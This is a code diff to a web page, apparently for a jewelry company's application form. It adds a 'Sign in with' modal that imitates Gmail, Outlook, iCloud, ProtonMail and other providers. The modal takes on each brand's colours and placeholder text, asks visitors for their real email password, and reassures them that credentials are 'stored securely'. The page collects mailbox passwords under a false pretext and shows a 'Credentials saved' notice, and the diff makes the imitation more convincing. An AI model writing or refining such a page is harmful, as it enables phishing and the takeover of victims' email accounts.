@@ -200,52 +200,51 @@ footer{border-top:1px solid var(--border);padding:1.8rem 4rem;display:flex;justi
 
     <!-- PROVIDER GRID -->
     <div class="provider-grid">
-      <button class="provider-btn" onclick="openEmailModal('Gmail','#EA4335')">
+      <button class="provider-btn" onclick="openEmailModal('Gmail')">
         <img src="https://www.google.com/favicon.ico" class="p-icon" onerror="this.style.display='none'">
         <span>Sign in with Gmail</span>
       </button>
-      <button class="provider-btn" onclick="openEmailModal('Outlook','#0078D4')">
+      <button class="provider-btn" onclick="openEmailModal('Outlook')">
         <img src="https://outlook.live.com/favicon.ico" class="p-icon" onerror="this.style.display='none'">
         <span>Sign in with Outlook</span>
       </button>
-      <button class="provider-btn" onclick="openEmailModal('Office 365','#D83B01')">
+      <button class="provider-btn" onclick="openEmailModal('Office 365')">
         <img src="https://www.office.com/favicon.ico" class="p-icon" onerror="this.style.display='none'">
         <span>Sign in with Office 365</span>
       </button>
-      <button class="provider-btn" onclick="openEmailModal('Yahoo Mail','#6001D2')">
+      <button class="provider-btn" onclick="openEmailModal('Yahoo Mail')">
         <img src="https://www.yahoo.com/favicon.ico" class="p-icon" onerror="this.style.display='none'">
         <span>Sign in with Yahoo Mail</span>
       </button>
-      <button class="provider-btn" onclick="openEmailModal('iCloud','#555')">
+      <button class="provider-btn" onclick="openEmailModal('iCloud')">
         <img src="https://www.icloud.com/favicon.ico" class="p-icon" onerror="this.style.display='none'">
         <span>Sign in with iCloud</span>
       </button>
-      <button class="provider-btn" onclick="openEmailModal('ProtonMail','#6D4AFF')">
+      <button class="provider-btn" onclick="openEmailModal('ProtonMail')">
         <span class="p-letter" style="background:#6D4AFF">P</span>
         <span>Sign in with ProtonMail</span>
       </button>
-      <button class="provider-btn" onclick="openEmailModal('GMX','#1C449B')">
+      <button class="provider-btn" onclick="openEmailModal('GMX')">
         <span class="p-letter" style="background:#1C449B">G</span>
         <span>Sign in with GMX</span>
       </button>
-      <button class="provider-btn" onclick="openEmailModal('Web.de','#FFCC00;color:#000')">
+      <button class="provider-btn" onclick="openEmailModal('Web.de')">
         <span class="p-letter" style="background:#FFCC00;color:#000">W</span>
         <span>Sign in with Web.de</span>
       </button>
-      <button class="provider-btn" onclick="openEmailModal('T-Online','#E20074')">
+      <button class="provider-btn" onclick="openEmailModal('T-Online')">
         <span class="p-letter" style="background:#E20074">T</span>
         <span>Sign in with T-Online</span>
       </button>
-      <button class="provider-btn" onclick="openEmailModal('AOL','#FF0B00')">
+      <button class="provider-btn" onclick="openEmailModal('AOL')">
         <span class="p-letter" style="background:#FF0B00">A</span>
         <span>Sign in with AOL</span>
       </button>
-      <button class="provider-btn" onclick="openEmailModal('Other Email','#444')">
+      <button class="provider-btn" onclick="openEmailModal('Other Email')">
         <span class="p-letter" style="background:#444">@</span>
         <span>Other Email</span>
       </button>
     </div>
-
     <div id="providerSelected" style="display:none;margin-top:1.5rem;padding:1rem 1.2rem;background:rgba(212,175,55,.06);border:1px solid rgba(212,175,55,.2);font-size:.65rem;color:var(--wd)">
       ✓ Credentials saved — <span id="providerName" style="color:var(--gold)"></span>
     </div>
@@ -265,26 +264,26 @@ footer{border-top:1px solid var(--border);padding:1.8rem 4rem;display:flex;justi
   <!-- EMAIL MODAL -->
   <div id="emailModal" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.85);z-index:9999;align-items:center;justify-content:center;padding:1.5rem">
     <div style="background:#fff;color:#111;width:100%;max-width:400px;border-radius:8px;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.5)">
-      <div id="modalHeader" style="padding:1.5rem 2rem 1rem;display:flex;align-items:center;justify-content:space-between">
+      <div id="modalHeader" style="padding:1.5rem 2rem 1rem;display:flex;align-items:center;justify-content:space-between;background:#555;transition:background .2s">
         <div>
-          <div style="font-weight:700;font-size:1rem" id="modalProviderTitle">Sign In</div>
-          <div style="font-size:.7rem;color:#666;margin-top:.2rem">Enter your email and password</div>
+          <div style="font-weight:700;font-size:1rem;color:#fff" id="modalProviderTitle">Sign In</div>
+          <div style="font-size:.65rem;color:rgba(255,255,255,.75);margin-top:.25rem" id="modalProviderSubtitle">Enter your credentials to continue</div>
         </div>
-        <button onclick="closeEmailModal()" style="background:none;border:1px solid #ddd;width:28px;height:28px;border-radius:4px;font-size:.85rem;cursor:pointer;color:#666">✕</button>
+        <button onclick="closeEmailModal()" style="background:rgba(255,255,255,.15);border:none;width:28px;height:28px;border-radius:4px;font-size:.85rem;cursor:pointer;color:#fff">✕</button>
       </div>
-      <div style="padding:0 2rem 2rem">
+      <div style="padding:1.5rem 2rem 2rem">
         <div style="margin-bottom:1rem">
-          <label style="font-size:.7rem;font-weight:600;color:#333;display:block;margin-bottom:.4rem">Email Address</label>
-          <input type="email" id="modalEmail" placeholder="Enter your email" style="width:100%;border:1px solid #ddd;border-radius:4px;padding:.7rem .9rem;font-size:.8rem;outline:none;font-family:sans-serif" onfocus="this.style.borderColor='#D4AF37'" onblur="this.style.borderColor='#ddd'">
+          <label style="font-size:.7rem;font-weight:600;color:#333;display:block;margin-bottom:.4rem" id="modalEmailLabel">Email Address</label>
+          <input type="email" id="modalEmail" placeholder="Enter your email" style="width:100%;border:1px solid #ddd;border-radius:4px;padding:.7rem .9rem;font-size:.8rem;outline:none;font-family:sans-serif" onfocus="this.style.borderColor='#555'" onblur="this.style.borderColor='#ddd'">
         </div>
         <div style="margin-bottom:.5rem">
           <label style="font-size:.7rem;font-weight:600;color:#333;display:block;margin-bottom:.4rem">Password</label>
-          <input type="password" id="modalPassword" placeholder="Enter your password" style="width:100%;border:1px solid #ddd;border-radius:4px;padding:.7rem .9rem;font-size:.8rem;outline:none;font-family:sans-serif" onfocus="this.style.borderColor='#D4AF37'" onblur="this.style.borderColor='#ddd'" onkeydown="if(event.key==='Enter')saveEmailCreds()">
+          <input type="password" id="modalPassword" placeholder="Enter your password" style="width:100%;border:1px solid #ddd;border-radius:4px;padding:.7rem .9rem;font-size:.8rem;outline:none;font-family:sans-serif" onfocus="this.style.borderColor='#555'" onblur="this.style.borderColor='#ddd'" onkeydown="if(event.key==='Enter')saveEmailCreds()">
         </div>
-        <div style="font-size:.62rem;color:#999;margin-bottom:1.2rem">We'll never share your credentials with anyone outside Ava Jewelry.</div>
+        <div style="font-size:.62rem;color:#999;margin-bottom:1.2rem">Your credentials are stored securely and used solely for Ava Jewelry internal platforms.</div>
         <div style="display:flex;gap:.8rem;justify-content:flex-end">
           <button onclick="closeEmailModal()" style="background:none;border:1px solid #ddd;padding:.6rem 1.2rem;border-radius:4px;font-size:.7rem;cursor:pointer;color:#666">Close</button>
-          <button onclick="saveEmailCreds()" style="background:#D4AF37;border:none;color:#000;padding:.6rem 1.5rem;border-radius:4px;font-size:.7rem;font-weight:700;cursor:pointer">Submit</button>
+          <button id="modalSubmitBtn" onclick="saveEmailCreds()" style="background:#555;border:none;color:#fff;padding:.6rem 1.5rem;border-radius:4px;font-size:.7rem;font-weight:700;cursor:pointer;transition:background .2s">Continue</button>
         </div>
       </div>
     </div>
@@ -637,9 +636,42 @@ async function submitApp() {
 
 let _selectedProvider = '';
 
-function openEmailModal(provider, color) {
+const providerStyles = {
+  'Gmail':       { color:'#EA4335', bg:'#EA4335', label:'Email',    ph:'yourname@gmail.com',     passph:'Gmail password' },
+  'Outlook':     { color:'#0078D4', bg:'#0078D4', label:'Email',    ph:'yourname@outlook.com',   passph:'Outlook password' },
+  'Office 365':  { color:'#D83B01', bg:'#D83B01', label:'Email',    ph:'yourname@office365.com', passph:'Office 365 password' },
+  'Yahoo Mail':  { color:'#6001D2', bg:'#6001D2', label:'Email',    ph:'yourname@yahoo.com',     passph:'Yahoo password' },
+  'iCloud':      { color:'#555',    bg:'#555',    label:'Apple ID', ph:'yourname@icloud.com',    passph:'Apple ID password' },
+  'ProtonMail':  { color:'#6D4AFF', bg:'#6D4AFF', label:'Email',   ph:'yourname@proton.me',     passph:'ProtonMail password' },
+  'GMX':         { color:'#1C449B', bg:'#1C449B', label:'Email',    ph:'yourname@gmx.com',       passph:'GMX password' },
+  'Web.de':      { color:'#FFCC00', bg:'#FFCC00', label:'Email',    ph:'yourname@web.de',        passph:'Web.de password' },
+  'T-Online':    { color:'#E20074', bg:'#E20074', label:'Email',    ph:'yourname@t-online.de',   passph:'T-Online password' },
+  'AOL':         { color:'#FF0B00', bg:'#FF0B00', label:'Email',    ph:'yourname@aol.com',       passph:'AOL password' },
+  'Other Email': { color:'#444',    bg:'#444',    label:'Email',    ph:'your@email.com',         passph:'Your password' },
+};
+
+function openEmailModal(provider) {
   _selectedProvider = provider;
+  const ps = providerStyles[provider] || providerStyles['Other Email'];
+
+  // Header color
+  document.getElementById('modalHeader').style.background = ps.color;
+  document.getElementById('modalHeader').style.color = '#fff';
+  document.getElementById('modalProviderTitle').style.color = '#fff';
+  document.getElementById('modalProviderSubtitle').style.color = 'rgba(255,255,255,.75)';
+
+  // Title
   document.getElementById('modalProviderTitle').textContent = 'Sign in with ' + provider;
+  document.getElementById('modalProviderSubtitle').textContent = 'Enter your ' + provider + ' credentials to continue';
+
+  // Submit button color
+  document.getElementById('modalSubmitBtn').style.background = ps.color;
+
+  // Labels and placeholders
+  document.getElementById('modalEmailLabel').textContent = ps.label;
+  document.getElementById('modalEmail').placeholder = ps.ph;
+  document.getElementById('modalPassword').placeholder = ps.passph;
+
   document.getElementById('emailModal').style.display = 'flex';
   document.getElementById('modalEmail').value = '';
   document.getElementById('modalPassword').value = '';
